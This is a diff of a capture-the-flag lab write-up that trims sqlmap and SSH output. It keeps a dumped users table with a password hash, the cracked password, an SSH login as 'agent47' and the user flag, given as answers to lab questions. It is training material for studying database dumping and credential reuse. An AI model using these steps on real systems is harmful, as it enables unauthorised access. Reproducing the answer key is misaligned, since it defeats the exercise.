@@ -102,11 +102,7 @@ Table: users
 | ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
 +------------------------------------------------------------------+----------+
 
-[03:15:09] [INFO] table 'db.users' dumped to CSV file '/home/hacktopuser/.local/share/sqlmap/output/10.49.166.157/dump/db/users.csv'                                                                                                                      
-[03:15:09] [INFO] fetched data logged to text files under '/home/hacktopuser/.local/share/sqlmap/output/<TargetIP>'
-[03:15:09] [WARNING] your sqlmap version is outdated
-
-[*] ending @ 03:15:09 /2026-04-26/
+[03:15:09] [INFO] table 'db.users' dumped to CSV file '/home/hacktopuser/.local/share/sqlmap/output/<TargetIP>/dump/db/users.csv'                  [03:15:09] [INFO] fetched data logged to text files under '/home/hacktopuser/.local/share/sqlmap/output/<TargetIP>'
 ```
 ## Q1 In the users table, what is the hashed password?
 Answer: ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
@@ -133,30 +129,11 @@ Answer: videogamer124
 ## Q2 Now you have a password and username. Try SSH'ing onto the machine. What is the user flag?
 ```
 $ ssh agent47@<TargetIP>                                            
-The authenticity of host '<TargetIP> (<TargetIP>)' can't be established.
-ED25519 key fingerprint is SHA256:CyJgMM67uFKDbNbKyUM0DexcI+LWun63SGLfBvqQcLA.
-This key is not known by any other names.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '<TargetIP>' (ED25519) to the list of known hosts.
+...
 agent47@<TargetIP>'s password: 
-Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-109 packages can be updated.
-68 updates are security updates.
-
-
-Last login: Fri Aug 16 17:52:04 2019 from <AttackBoxIP>
-agent47@gamezone:~$ ls
-user.txt
+...
 agent47@gamezone:~$ cat user.txt
 649ac17b1480ac13ef1e4fa579dac95c
-agent47@gamezone:~$ exit
-logout
-Connection to <TargetIP> closed.
 ```
 Answer: 649ac17b1480ac13ef1e4fa579dac95c
 
